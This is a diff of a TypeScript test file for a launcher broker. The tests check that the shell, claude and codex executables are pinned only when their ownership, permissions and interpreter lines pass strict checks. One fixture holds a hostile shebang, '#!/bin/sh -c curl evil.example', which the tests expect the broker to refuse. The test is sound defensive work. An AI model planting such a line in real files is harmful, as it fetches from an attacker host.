@@ -15,7 +15,9 @@ import {
   buildBrokerLaunch,
   buildWorkflowPolicyTable,
   codexSandboxMode,
+  CODEX_EXECUTABLE_CANDIDATES,
   enumerateBrokerLaunchers,
+  pinPipeStdinExec,
   launcherExecutable,
   pinBrokerLaunch,
   pinnableLauncher,
@@ -79,6 +81,10 @@ describe('fdPinnedPaths', () => {
     ]);
     expect(Object.keys(codex.env).sort()).toEqual([...LINUX_CHILD_ENV_KEYS].sort());
     expect(codex.env).not.toHaveProperty('TOKEN');
+
+    // `codex exec -` names stdin as its prompt source and `claude -p` refuses a tty there, so BOTH
+    // headless launchers earn a pipe on fd 0 - the mode decides it, not the launcher's name.
+    expect([claude.stdinMode, codex.stdinMode]).toEqual(['pipe', 'pipe']);
   });
 
   /**
@@ -192,6 +198,8 @@ describe('fdPinnedPaths', () => {
       toolPolicyId: 'checker-readonly', sandbox: 'codex-workspace-write',
     }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
     expect(interactive.args.slice(0, 4)).toEqual(['--model', 'gpt-5.6-terra', '-s', 'read-only']);
+    // ...and an interactive recipe keeps its tty on stdin, on the same launcher.
+    expect(interactive.stdinMode).toBe('tty');
   });
 
   /**
@@ -297,6 +305,7 @@ describe('fdPinnedPaths', () => {
     }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
     expect(shell.executable).toBe('/bin/bash');
     expect(shell.args).toEqual([]);
+    expect(shell.stdinMode).toBe('tty');
     // ...and no other policy id can be smuggled onto the shell launcher in its place.
     for (const toolPolicyId of ['producer', 'standard']) {
       expect(() => buildBrokerLaunch({
@@ -408,29 +417,51 @@ describe('fdPinnedPaths', () => {
 type FakeNode = { kind: 'file' | 'directory'; uid: number; gid: number; mode: number; content?: string };
 const PIN_IDENTITIES = { rootUid: 0, shellUid: 1000, shellGid: 1000, dashboardUid: 1001, dashboardGid: 1001 };
 
-/** The provisioned VM: both CLIs installed under the 0700 kb-shell home, bash where bash lives. */
+/**
+ * The provisioned VM, as verified on the box (2026-09-03): `~/.local/bin/claude` is a NATIVE binary,
+ * while `~/.local/bin/codex` is a 7 KB `#!/usr/bin/env node` wrapper whose only job is to spawn the
+ * vendored native under `.local/lib/node_modules/@openai/codex/node_modules/...`. Every component of
+ * that nested path is kb-shell:kb-shell 0700, which is what the walk demands. Describing the wrapper
+ * as if it were the real entrypoint is what made codex look launchable when it is not.
+ */
 function vmTree(): Record<string, FakeNode> {
   const rootDir = (mode = 0o755): FakeNode => ({ kind: 'directory', uid: 0, gid: 0, mode });
   const homeDir = (mode: number): FakeNode => ({ kind: 'directory', uid: 1000, gid: 1000, mode });
   const cli = (content: string): FakeNode => ({ kind: 'file', uid: 1000, gid: 1000, mode: 0o700, content });
-  return {
+  const tree: Record<string, FakeNode> = {
     '/': rootDir(),
     '/bin': rootDir(),
     '/bin/bash': { kind: 'file', uid: 0, gid: 0, mode: 0o755, content: 'ELF' },
     '/usr': rootDir(),
     '/usr/bin': rootDir(),
     '/usr/bin/node': { kind: 'file', uid: 0, gid: 0, mode: 0o755, content: 'ELF' },
+    '/usr/bin/python3': { kind: 'file', uid: 0, gid: 0, mode: 0o755, content: 'ELF' },
     '/var': rootDir(),
     '/var/lib': rootDir(),
     '/var/lib/kb-shell': { kind: 'directory', uid: 0, gid: 1000, mode: 0o750 },
     '/var/lib/kb-shell/home': homeDir(0o700),
     '/var/lib/kb-shell/home/.local': homeDir(0o750),
     '/var/lib/kb-shell/home/.local/bin': homeDir(0o750),
-    // The real shape: npm-installed CLIs are node scripts, so enumeration must clear the shebang
-    // allowlist and pin the interpreter too, exactly as launch does.
-    '/var/lib/kb-shell/home/.local/bin/claude': cli('#!/usr/bin/env node\nrequire("./cli.js");\n'),
-    '/var/lib/kb-shell/home/.local/bin/codex': cli('#!/usr/bin/env node\nrequire("./cli.js");\n'),
+    '/var/lib/kb-shell/home/.local/bin/claude': cli('ELF'),
+    '/var/lib/kb-shell/home/.local/bin/codex': cli('#!/usr/bin/env node\nspawn(vendored);\n'),
   };
+  // Candidate (a): the nested npm layout, directory by directory.
+  let at = '/var/lib/kb-shell/home/.local';
+  for (const part of ['lib', 'node_modules', '@openai', 'codex', 'node_modules', '@openai',
+    'codex-linux-x64', 'vendor', 'x86_64-unknown-linux-musl', 'bin']) {
+    at = `${at}/${part}`;
+    tree[at] = homeDir(0o700);
+  }
+  tree[`${at}/codex`] = cli('ELF');
+  return tree;
+}
+
+/** Both codex candidates, so a fixture can describe a machine where codex is genuinely absent. */
+function withoutCodex(tree: Record<string, FakeNode>): Record<string, FakeNode> {
+  for (const path of Object.keys(tree)) {
+    if (path.endsWith('/codex') || path.includes('/@openai/')) delete tree[path];
+  }
+  return tree;
 }
 
 function pinningFsOver(tree: Record<string, FakeNode>): PinningFileSystem & { openFds(): number } {
@@ -472,6 +503,40 @@ function pinningFsOver(tree: Record<string, FakeNode>): PinningFileSystem & { op
   };
 }
 
+/**
+ * D5: the shim is code the broker is about to run as itself, so whoever can WRITE it owns every
+ * headless child. It is opened by a path the broker derives from its own module location - never from
+ * the wire - and then checked ON THAT DESCRIPTOR: no group or other write bit, owned by root (the
+ * release on the VM) or by the broker's own account, which could rewrite the payload anyway.
+ */
+describe('pinPipeStdinExec', () => {
+  const SHIM = '/opt/kb-shell-broker/current/server/pty/pipeStdinExec.py';
+  const shimTree = (node: FakeNode): Record<string, FakeNode> => ({ ...vmTree(), [SHIM]: node });
+  const file = (uid: number, mode: number): FakeNode => ({ kind: 'file', uid, gid: 0, mode, content: 'py' });
+
+  it('accepts a root-owned or broker-owned shim with no group or other write bit', () => {
+    for (const node of [file(0, 0o444), file(0, 0o644), file(1000, 0o600)]) {
+      const fs = pinningFsOver(shimTree(node));
+      const pinned = pinPipeStdinExec(SHIM, PIN_IDENTITIES, fs);
+      expect(pinned.interpreter).toMatch(/^\/proc\/self\/fd\/\d+$/);
+      pinned.close();
+      expect(fs.openFds()).toBe(0);
+    }
+  });
+
+  it('refuses a writable shim, a stranger-owned shim, and a missing python3', () => {
+    for (const node of [file(0, 0o664), file(0, 0o646), file(0, 0o777), file(1234, 0o600)]) {
+      const fs = pinningFsOver(shimTree(node));
+      expect(() => pinPipeStdinExec(SHIM, PIN_IDENTITIES, fs)).toThrow(FdPinnedPathError);
+      // Every descriptor released on the refusing path too, or the broker leaks one per boot attempt.
+      expect(fs.openFds()).toBe(0);
+    }
+    const noPython = shimTree(file(0, 0o444));
+    delete noPython['/usr/bin/python3'];
+    expect(() => pinPipeStdinExec(SHIM, PIN_IDENTITIES, pinningFsOver(noPython))).toThrow(FdPinnedPathError);
+  });
+});
+
 describe('enumerateBrokerLaunchers', () => {
   it('names the launchers a provisioned VM can actually pin, resolving paths from the launch table', async () => {
     expect(launcherExecutable('shell')).toBe('/bin/bash');
@@ -482,13 +547,11 @@ describe('enumerateBrokerLaunchers', () => {
   });
 
   it('answers shell-only and one-CLI machines honestly instead of the full set', async () => {
-    const shellOnly = vmTree();
+    const shellOnly = withoutCodex(vmTree());
     delete shellOnly['/var/lib/kb-shell/home/.local/bin/claude'];
-    delete shellOnly['/var/lib/kb-shell/home/.local/bin/codex'];
     expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(shellOnly))).toEqual(['shell']);
 
-    const claudeOnly = vmTree();
-    delete claudeOnly['/var/lib/kb-shell/home/.local/bin/codex'];
+    const claudeOnly = withoutCodex(vmTree());
     expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(claudeOnly)))
       .toEqual(['shell', 'claude']);
   });
@@ -497,9 +560,11 @@ describe('enumerateBrokerLaunchers', () => {
     // 0755 inside the 0700 provider home: the pin's ownership/mode matrix refuses it. The binary
     // EXISTS; the honest answer is still that it cannot be launched.
     const worldReadable = vmTree();
-    worldReadable['/var/lib/kb-shell/home/.local/bin/codex'] = {
-      kind: 'file', uid: 1000, gid: 1000, mode: 0o755, content: '#!/usr/bin/env node\n',
-    };
+    for (const path of Object.keys(worldReadable)) {
+      if (path.endsWith('/codex') && worldReadable[path]!.kind === 'file') {
+        worldReadable[path] = { ...worldReadable[path]!, mode: 0o755 };
+      }
+    }
     expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(worldReadable)))
       .toEqual(['shell', 'claude']);
     expect(await pinnableLauncher('codex', PIN_IDENTITIES, pinningFsOver(worldReadable))).toBe(false);
@@ -507,11 +572,68 @@ describe('enumerateBrokerLaunchers', () => {
     // Same rule for the shebang allowlist: an interpreter line that is not an approved absolute
     // /bin or /usr/bin name drops the launcher rather than being executed to find out.
     const badInterpreter = vmTree();
-    badInterpreter['/var/lib/kb-shell/home/.local/bin/claude'] = {
-      kind: 'file', uid: 1000, gid: 1000, mode: 0o700, content: '#!/bin/sh -c curl evil.example\n',
-    };
+    badInterpreter['/bin/bash'] = { kind: 'file', uid: 0, gid: 0, mode: 0o755,
+      content: '#!/bin/sh -c curl evil.example\n' };
     expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(badInterpreter)))
+      .toEqual(['claude', 'codex']);
+  });
+
+  /**
+   * D2: codex is pinned at the vendored NATIVE binary, never at the npm wrapper. The wrapper is a
+   * `#!/usr/bin/env node` script, and a script entrypoint reaches its interpreter as a descriptor
+   * that is already closed by then - so `create` refuses it for an agent launcher. A probe that named
+   * codex off the wrapper would advertise a launcher every attempt then fails to start.
+   */
+  it('resolves codex to the vendored native binary and refuses a wrapper-only install', async () => {
+    const nested = `/var/lib/kb-shell/home/.local/lib/node_modules/@openai/codex/node_modules`
+      + `/@openai/codex-linux-x64/vendor/x86_64-unknown-linux-musl/bin/codex`;
+    expect(CODEX_EXECUTABLE_CANDIDATES[0]).toBe(nested);
+    expect(CODEX_EXECUTABLE_CANDIDATES[2]).toBe('/var/lib/kb-shell/home/.local/bin/codex');
+    expect(await pinnableLauncher('codex', PIN_IDENTITIES, pinningFsOver(vmTree()))).toBe(true);
+
+    // The hoisted layout, candidate (b): the nested copy is gone, the hoisted one is not.
+    const hoisted = vmTree();
+    delete hoisted[nested];
+    hoisted[CODEX_EXECUTABLE_CANDIDATES[1]] = { kind: 'file', uid: 1000, gid: 1000, mode: 0o700, content: 'ELF' };
+    for (const part of ['@openai', '@openai/codex-linux-x64', '@openai/codex-linux-x64/vendor',
+      '@openai/codex-linux-x64/vendor/x86_64-unknown-linux-musl',
+      '@openai/codex-linux-x64/vendor/x86_64-unknown-linux-musl/bin']) {
+      hoisted[`/var/lib/kb-shell/home/.local/lib/node_modules/${part}`]
+        = { kind: 'directory', uid: 1000, gid: 1000, mode: 0o700 };
+    }
+    expect(await pinnableLauncher('codex', PIN_IDENTITIES, pinningFsOver(hoisted))).toBe(true);
+
+    // Wrapper only: no native candidate anywhere, so the launcher is NOT advertised.
+    const wrapperOnly = vmTree();
+    delete wrapperOnly[nested];
+    expect(await pinnableLauncher('codex', PIN_IDENTITIES, pinningFsOver(wrapperOnly))).toBe(false);
+    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(wrapperOnly)))
+      .toEqual(['shell', 'claude']);
+  });
+
+  /**
+   * D1: the probe applies the preconditions `create` applies. Every agent launch is `headless-json`,
+   * and headless needs a non-script entrypoint AND the boot-time python3 exec pin. Either missing and
+   * the launcher is refused at create, so the enumeration must not name it.
+   */
+  it('drops the agent launchers when the headless preconditions do not hold', async () => {
+    // A shebang claude: legal for the tty path, refused for every attempt the dashboard makes.
+    const scriptedClaude = vmTree();
+    scriptedClaude['/var/lib/kb-shell/home/.local/bin/claude'] = {
+      kind: 'file', uid: 1000, gid: 1000, mode: 0o700, content: '#!/usr/bin/env node\nrequire("./cli.js");\n',
+    };
+    expect(await pinnableLauncher('claude', PIN_IDENTITIES, pinningFsOver(scriptedClaude))).toBe(false);
+    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(scriptedClaude)))
       .toEqual(['shell', 'codex']);
+
+    // The boot-time pipe-stdin exec pin failed (no /usr/bin/python3): shell only, and honestly so.
+    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(vmTree()), false))
+      .toEqual(['shell']);
+    expect(await pinnableLauncher('shell', PIN_IDENTITIES, pinningFsOver(vmTree()), false)).toBe(true);
+    for (const launcher of ['claude', 'codex'] as const) {
+      expect(await pinnableLauncher(launcher, PIN_IDENTITIES, pinningFsOver(vmTree()), false), launcher)
+        .toBe(false);
+    }
   });
 
   it('closes every descriptor it opened, on the accepting path and the refusing one alike', async () => {
@@ -522,10 +644,9 @@ describe('enumerateBrokerLaunchers', () => {
     expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, accepting)).toEqual(['shell', 'claude', 'codex']);
     expect(accepting.openFds()).toBe(0);
 
-    const refusing = vmTree();
-    delete refusing['/var/lib/kb-shell/home/.local/bin/codex'];
+    const refusing = withoutCodex(vmTree());
     refusing['/var/lib/kb-shell/home/.local/bin/claude'] = {
-      kind: 'file', uid: 1000, gid: 1000, mode: 0o755, content: '#!/usr/bin/env node\n',
+      kind: 'file', uid: 1000, gid: 1000, mode: 0o755, content: 'ELF',
     };
     const refused = pinningFsOver(refusing);
     expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, refused)).toEqual(['shell']);
